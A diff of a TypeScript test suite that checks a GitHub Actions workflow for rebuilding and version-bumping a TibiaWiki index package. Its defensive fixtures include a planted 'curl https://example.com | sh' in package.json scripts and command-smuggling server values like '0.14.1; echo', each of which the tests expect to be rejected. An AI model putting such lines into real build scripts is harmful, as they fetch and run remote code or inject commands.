+  const schema = stepIndex(list, 'schema');
+  assert.ok(stepIndex(list, 'guard') < schema, 'the schema level is decided before the guard');
+  assert.equal(stepIf(list[schema]!), "${{ steps.digests.outputs.changed == 'true' }}", 'the schema level is not gated on a changed digest');
+  assert.ok(stepScript(workflow(), 'schema').includes('node scripts/schema-diff.ts "$RUNNER_TEMP/committed.db" index.db'),
+    'the schema level does not compare the kept index with the rebuilt one');
+});
+
+test('the schema level is minor when the rebuilt index added a table or a column, and patch otherwise', () => {
+  const cases: Array<[string, string]> = [
+    ['{"added":["creature.race_id"],"removed":[]}\n', 'minor'],
+    ['{"added":["achievement"],"removed":["npc_location"]}\n', 'minor'],
+    ['{"added":[],"removed":["creature.race_id"]}\n', 'patch'],
+    ['{"added":[],"removed":[]}\n', 'patch'],
+  ];
+  for (const [diff, level] of cases) {
+    const run = runSchema(diff);
+    assert.equal(run.status, 0, run.log);
+    assert.equal(run.output, `level=${level}\n`, diff);
+  }
+});
+
+test('the schema level fails, and hands nothing on, when the schemas cannot be compared', () => {
+  for (const [what, stdout, exit] of [
+    ['the script cannot read an index', '', 1],
+    ['the script prints what is not JSON', 'nope\n', 0],
+    ['the script prints no lists', '{"added":"creature.race_id"}\n', 0],
+    ['the script prints null', 'null\n', 0],
+  ] as const) {
+    const run = runSchema(stdout, exit);
+    assert.notEqual(run.status, 0, `the step passed when ${what}\n${run.log}`);
+    assert.equal(run.output, '', `the step handed on a level when ${what}`);
+  }
+});
+
+/** The pr job's steps, each named by its id, or by the action it uses when it has none. */
+const PR_STEPS = [
+  'actions/checkout',
+  'actions/setup-node',
+  'check',
+  'pnpm/setup',
+  'recompute',
+  'scope',
+  'manifests',
+  'actions/download-artifact',
+  'verify',
+  'version',
+  'token',
+  'propose',
+  'wait',
+];
+
+const PIN_MOVED_IF = "${{ needs.build.outputs.pin_moved == 'true' }}";
+
+test('the pr job checks what the build job handed on, recomputes the pin and compares it, before anything else', () => {
+  const list = steps(prJob());
+  assert.deepEqual(list.map((step) => /^ *(?:- +)?id: *(\S+)$/m.exec(step)?.[1] ?? scalar(stepBody(step), 'uses')?.replace(/@.*$/, '')), PR_STEPS);
+  const check = prStep('check');
+  assert.equal(stepScript(workflow(), 'check'), CHECK_RUN);
+  assert.equal(stepIf(check), undefined, 'the check runs only sometimes');
+  assert.deepEqual(sortedLines(under(stepBody(check), 'env')), [
+    'CHANGED: ${{ needs.build.outputs.changed }}',
+    'LEVEL: ${{ needs.build.outputs.level }}',
+    'PIN_MOVED: ${{ needs.build.outputs.pin_moved }}',
+    'SERVER: ${{ needs.build.outputs.server }}',
+  ]);
+  for (const [id, script] of [['recompute', RECOMPUTE_RUN], ['scope', SCOPE_RUN], ['manifests', MANIFESTS_RUN]] as const) {
+    assert.equal(stepScript(workflow(), id), script, `the ${id} step runs another script`);
+    assert.equal(stepIf(prStep(id)), PIN_MOVED_IF, `the ${id} step does not run exactly when the pin moved`);
+  }
+  assert.deepEqual(sortedLines(under(stepBody(prStep('recompute')), 'env')), ['SERVER: ${{ needs.build.outputs.server }}']);
+  assert.deepEqual(sortedLines(under(stepBody(prStep('scope')), 'env')), ['SERVER: ${{ needs.build.outputs.server }}']);
+  assert.deepEqual(sortedLines(under(stepBody(prStep('manifests')), 'env')), [
+    'PACKAGE_JSON_SHA256: ${{ needs.build.outputs.package_json_sha256 }}',
+    'PNPM_LOCK_SHA256: ${{ needs.build.outputs.pnpm_lock_sha256 }}',
+  ]);
+  // The rebuilt index is taken only when the content changed, after the manifests passed.
+  assert.equal(stepIf(prStep('verify')), "${{ needs.build.outputs.changed == 'true' }}", 'the index is taken when the content did not change');
+  assert.deepEqual(sortedLines(under(stepBody(prStep('version')), 'env')), [
+    'CHANGED: ${{ needs.build.outputs.changed }}',
+    'LEVEL: ${{ needs.build.outputs.level }}',
+  ]);
+});
+
+test("the pr job's pnpm/setup installs pnpm alone and restores no cache", () => {
+  const setups = steps(prJob()).filter((step) => /uses: *pnpm\/setup@/.test(step));
+  assert.equal(setups.length, 1, 'expected one pnpm/setup in the pr job');
+  assert.deepEqual(sortedLines(stepInputs(setups[0]!)), [`cache-dependency-path: ${PR_NO_CACHE}`, 'install: false'],
+    'the pr job sets up pnpm with other inputs than install: false and a cache key on a file that never exists');
+  assert.equal(stepIf(setups[0]!), undefined);
+});
+
+test(`no file ${PR_NO_CACHE} exists, so the pr job's pnpm/setup finds no lockfile to key a cache on`, () => {
+  assert.ok(!existsSync(new URL(`../${PR_NO_CACHE}`, import.meta.url)), `${PR_NO_CACHE} exists`);
+});
+
+test('the pr job never downloads the manifests: the artifact is index.db alone, and the pr job takes only it', () => {
+  const downloads = steps(prJob()).filter((step) => /uses: *actions\/download-artifact@/.test(step));
+  assert.equal(downloads.length, 1, 'expected one download in the pr job');
+  assert.deepEqual(sortedLines(stepInputs(downloads[0]!)), ['name: index', 'path: ${{ runner.temp }}/index']);
+  const uploads = steps(buildJob()).filter((step) => /uses: *actions\/upload-artifact@/.test(step));
+  assert.equal(uploads.length, 1, 'expected one upload in the build job');
+  assert.equal(scalar(stepInputs(uploads[0]!), 'path'), 'index.db', 'the artifact holds more than index.db');
+  // The two hashes reach the manifests step, and no other step of the pr job.
+  const pr = prJob();
+  assert.equal(pr.match(/needs\.build\.outputs\.(?:package_json_sha256|pnpm_lock_sha256)/g)?.length, 2, 'another pr job step reads the manifest hashes');
+});
+
+/** What the pr job's check reads from its env for a refresh whose content changed and whose pin stayed. */
+const CHECK_ENV = { CHANGED: 'true', PIN_MOVED: 'false', LEVEL: 'patch', SERVER: '0.13.1' };
+
+const runCheck = (env: Record<string, string>) =>
+  runStep(stepScript(workflow(), 'check'), {
+    files: { 'package.json': manifestWithPin('0.13.1'), 'scripts/server-pin.ts': serverPinScript() },
+    env,
+  });
+
+test("the pr job's check passes what the build job may hand on", () => {
+  for (const env of [
+    CHECK_ENV,
+    { ...CHECK_ENV, LEVEL: 'minor' },
+    { ...CHECK_ENV, CHANGED: 'false', PIN_MOVED: 'true', SERVER: '0.14.1' },
+    { ...CHECK_ENV, PIN_MOVED: 'true', SERVER: '1.0.0', LEVEL: 'minor' },
+  ]) {
+    const run = runCheck(env);
+    assert.equal(run.status, 0, `${JSON.stringify(env)}\n${run.log}`);
+    assert.deepEqual(run.calls, []);
+  }
+});
+
+test("the pr job's check rejects a level, a pin_moved or a server the build job may not hand on", () => {
+  const cases: Array<[string, Record<string, string>]> = [
+    ['level is major', { LEVEL: 'major' }],
+    ['level is empty', { LEVEL: '' }],
+    ['level has a second line', { LEVEL: 'patch\nminor' }],
+    ['pin_moved is yes', { PIN_MOVED: 'yes' }],
+    ['pin_moved is empty', { PIN_MOVED: '' }],
+    ['changed is yes', { CHANGED: 'yes' }],
+    ['neither the content nor the pin changed', { CHANGED: 'false' }],
+    ['the server is below the pin', { PIN_MOVED: 'true', SERVER: '0.12.0' }],
+    ['the server is the pin, though it moved', { PIN_MOVED: 'true' }],
+    ['the server is not the pin, though it stayed', { SERVER: '0.14.1' }],
+    ['the server is empty', { SERVER: '' }],
+    ['the server has a trailing newline', { SERVER: '0.13.1\n' }],
+    ['the server is not x.y.z', { PIN_MOVED: 'true', SERVER: '0.14.1; echo' }],
+  ];
+  for (const [what, override] of cases) {
+    const run = runCheck({ ...CHECK_ENV, ...override });
+    assert.notEqual(run.status, 0, `the check passed when ${what}\n${run.log}`);
+    assert.deepEqual(run.calls, [], `the check ran ${commandsOf(run.calls).join(', ')} when ${what}`);
+  }
+});
+
+test('the recompute pins the server on the lockfile alone, and runs pnpm on nothing but an x.y.z version', () => {
+  const run = runStep(stepScript(workflow(), 'recompute'), { commands: { pnpm: '' }, env: { SERVER: '0.14.1' } });
+  assert.equal(run.status, 0, run.log);
+  assert.deepEqual(run.calls, [{ command: 'pnpm', args: ['add', '-D', '--save-exact', '--lockfile-only', '--ignore-scripts', '--ignore-pnpmfile', '@tibia.sh/tibiawiki-mcp@0.14.1'] }]);
+  for (const server of ['', '0.14', '0.14.1\n', '0.14.1 --global', '0.14.1; echo']) {
+    const bad = runStep(stepScript(workflow(), 'recompute'), { commands: { pnpm: '' }, env: { SERVER: server } });
+    assert.notEqual(bad.status, 0, `the recompute passed on the server ${JSON.stringify(server)}\n${bad.log}`);
+    assert.deepEqual(bad.calls, [], `the recompute ran pnpm on the server ${JSON.stringify(server)}`);
+  }
+});
+
+/** A stand-in git that lists `names` as changed and prints `main` as main's package.json. */
+const fakeScopeGit = (names: string, main: string): string =>
+  `const args = process.argv.slice(2);\n` +
+  `if (args.join(' ') === 'diff --name-only') process.stdout.write(${JSON.stringify(names)});\n` +
+  `else if (args.join(' ') === 'show HEAD:package.json') process.stdout.write(${JSON.stringify(main)});\n` +
+  `else { process.stderr.write('the stand-in git does not answer this call\\n'); process.exitCode = 98; }\n`;
+
+const BOTH_MANIFESTS = 'package.json\npnpm-lock.yaml\n';
+
+const runScope = (manifest: string, names = BOTH_MANIFESTS, server = '0.14.1') =>
+  runStep(stepScript(workflow(), 'scope'), {
+    files: { 'package.json': manifest },
+    commands: { git: fakeScopeGit(names, manifestWithPin('0.13.1')) },
+    env: { SERVER: server },
+  });
+
+test('the diff check passes a recompute that changed only the pin of the server', () => {
+  const run = runScope(manifestWithPin('0.14.1'));
+  assert.equal(run.status, 0, run.log);
+});
+
+test('the diff check rejects a recompute that changed more than the pin of the server', () => {
+  const pinned = manifestWithPin('0.14.1');
+  const cases: Array<[string, string, string?, string?]> = [
+    ['package.json changed its scripts', pinned.replace('"test": "', '"test": "curl https://example.com | sh; ')],
+    ['package.json changed another devDependency', pinned.replace(/"typescript": "[^"]*"/, '"typescript": "7.0.3"')],
+    ['package.json was reformatted', pinned.replaceAll('  ', '\t')],
+    ['package.json pins another server than the one handed on', manifestWithPin('0.14.2')],
+    ['package.json pins nothing new', manifestWithPin('0.13.1')],
+    ['another file changed too', pinned, `index.db\n${BOTH_MANIFESTS}`],
+    ['the lockfile did not change', pinned, 'package.json\n'],
+    ['nothing changed', pinned, ''],
+  ];
+  for (const [what, manifest, names] of cases) {
+    const run = runScope(manifest, names);
+    assert.notEqual(run.status, 0, `the diff check passed when ${what}\n${run.log}`);
+  }
+});
+
+const runManifests = (packageJson: string, pnpmLock: string) =>
+  runStep(stepScript(workflow(), 'manifests'), {
+    files: { 'package.json': manifestWithPin('0.14.1'), 'pnpm-lock.yaml': `${LOCK}server: 0.14.1\n` },
+    env: { PACKAGE_JSON_SHA256: packageJson, PNPM_LOCK_SHA256: pnpmLock },
+  });
+
+test('the manifests pass only when both hash to what the build job built index.db with', () => {
+  const packageJson = sha256(manifestWithPin('0.14.1'));
+  const pnpmLock = sha256(`${LOCK}server: 0.14.1\n`);
+  const good = runManifests(packageJson, pnpmLock);
+  assert.equal(good.status, 0, good.log);
+  const cases: Array<[string, string, string]> = [
+    ['package.json hashes to another value', sha256(manifestWithPin('0.13.1')), pnpmLock],
+    ['pnpm-lock.yaml hashes to another value', packageJson, sha256(LOCK)],
+    ['the two hashes are swapped', pnpmLock, packageJson],
+    ['the package.json hash is empty', '', pnpmLock],
+    ['the lockfile hash is uppercase', packageJson, pnpmLock.toUpperCase()],
+    ['the package.json hash is short', packageJson.slice(1), pnpmLock],
+    ['the lockfile hash has a second line', packageJson, `${pnpmLock}\n${pnpmLock}`],
+  ];
+  for (const [what, a, b] of cases) {
+    const run = runManifests(a, b);
+    assert.notEqual(run.status, 0, `the manifests passed when ${what}\n${run.log}`);
+  }
+});
+
+test('the version step sets the next minor when the rebuilt index grew its schema', () => {
+  const cases: Array<[string, string[], string]> = [
+    ['3.2.1', ['3.2.1'], '3.3.0'],
+    ['3.2.1', ['3.2.0', '3.2.1', '3.3.0'], '3.4.0'],
+    ['3.9.4', ['3.9.4', '3.10.0'], '3.11.0'],
+  ];
+  for (const [current, versions, next] of cases) {
+    const run = runVersion(current, `${JSON.stringify(versions)}\n`, 0, 'minor');
+    assert.equal(run.status, 0, `${current} with ${versions.join(', ')} on npm\n${run.log}`);
+    assert.equal(run.output, `version=${next}\n`, `${current} with ${versions.join(', ')} on npm`);
+    assert.equal(run.checkout['package.json'], manifestAt(next), 'package.json changed in more than its version');
+  }
+  for (const level of ['major', '']) {
+    const run = runVersion('3.2.1', '["3.2.1"]\n', 0, level);
+    assert.notEqual(run.status, 0, `the step passed at the level ${JSON.stringify(level)}\n${run.log}`);
+    assert.equal(run.output, '', `the step wrote a version at the level ${JSON.stringify(level)}`);
+  }
+});
+
+test('a pin-only run of the version step leaves the version as it is, and asks npm nothing', () => {
+  const run = runStep(stepScript(workflow(), 'version'), {
+    files: { 'package.json': manifestWithPin('0.14.1', '3.2.1') },
+    env: { CHANGED: 'false', LEVEL: 'patch' },
+  });
+  assert.equal(run.status, 0, run.log);
+  assert.equal(run.output, 'version=3.2.1\n');
+  assert.deepEqual(run.calls, [], 'the step asked npm for a version it does not change');
+  assert.equal(run.checkout['package.json'], manifestWithPin('0.14.1', '3.2.1'), 'package.json changed');
+});
+
+test('a pin-only run proposes package.json and pnpm-lock.yaml alone, at the same version, and says nothing publishes', () => {
+  // Deterministic, as the runner would chain the steps: the recompute with a stand-in pnpm, the version step, and
+  // propose with a stand-in git and gh, each in the checkout the step before it left.
+  const recompute = runStep(stepScript(workflow(), 'recompute'), {
+    files: { 'package.json': manifestWithPin('0.13.1', '3.2.1'), 'pnpm-lock.yaml': LOCK, 'index.db': 'committed index' },
+    commands: { pnpm: fakePinPnpm() },
+    env: { SERVER: '0.14.1' },
+  });
+  assert.equal(recompute.status, 0, recompute.log);
+  assert.equal(recompute.checkout['package.json'], manifestWithPin('0.14.1', '3.2.1'));
+
+  const version = runStep(stepScript(workflow(), 'version'), {
+    files: recompute.checkout,
+    env: { CHANGED: 'false', LEVEL: 'patch' },
+  });
+  assert.equal(version.status, 0, version.log);
+  assert.equal(version.output, 'version=3.2.1\n', 'a pin-only run changed the version');
+  assert.deepEqual(version.calls, []);
+
+  const propose = runStep(stepScript(workflow(), 'propose'), {
+    files: version.checkout,
+    commands: { git: fakeGit(), gh: fakeGh({}) },
+    env: { ...PR_ENV, CHANGED: 'false', SERVER: '0.14.1', VERSION: stepOutputs(version.output)['version']!, COMMITTED: DIGEST_A, REBUILT: DIGEST_A, GH_TOKEN: APP_TOKEN },
+  });
+  assert.equal(propose.status, 0, propose.log);
+  assert.equal(propose.checkout['package.json'], manifestWithPin('0.14.1', '3.2.1'), 'propose changed package.json');
+  assert.equal(propose.checkout['index.db'], 'committed index', 'propose changed index.db');
+  const git = propose.calls.filter((call) => call.command === 'git').map((call) => call.args);
+  assert.deepEqual(git.filter((args) => args[0] === 'add').map((args) => args.slice(1).sort()), [['package.json', 'pnpm-lock.yaml']],
+    'the pin-only commit does not stage exactly package.json and pnpm-lock.yaml');
+  const create = ghCalls(propose.calls).find((args) => args.includes('--method'))!;
+  const fields = flagValues(create, '-f');
+  assert.ok(fields.includes('title=chore: pin the server at 0.14.1'), `unexpected title in ${fields.join(' | ')}`);
+  const body = fields.find((field) => field.startsWith('body='));
+  assert.match(body ?? '', /publishes nothing/, `the body does not say nothing publishes: ${body}`);
+  assert.match(body ?? '', /3\.2\.1/, 'the body does not name the version that stays');
+  assert.doesNotMatch(body ?? '', /refreshed index/, 'the body speaks of a refreshed index');
+  assert.deepEqual(ghCalls(propose.calls).find((args) => args[0] === 'pr'), ['pr', 'merge', '12', '--auto', '--rebase'],
+    'a pin-only pull request does not merge by itself');
 });
 
 /** The title the alert job looks for and opens its issue with. */
